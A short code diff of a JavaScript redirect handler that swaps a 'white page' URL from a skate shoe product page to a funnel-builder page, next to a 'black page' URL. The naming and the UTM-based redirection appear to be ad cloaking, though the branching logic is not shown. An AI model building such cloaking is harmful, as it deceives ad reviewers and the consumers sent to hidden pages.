@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.skatesusa.com/collections/men-shoes/products/es-shoes-accel-x-go-skateboarding-day-grey";
+    const whitePageURL = "https://YAbHewMyUM.myfunnelish.com/target2342-asif";
     const blackPageURL = "https://YAbHewMyUM.myfunnelish.com/target2342";
   
     // Parse the UTM parameters from the request URL
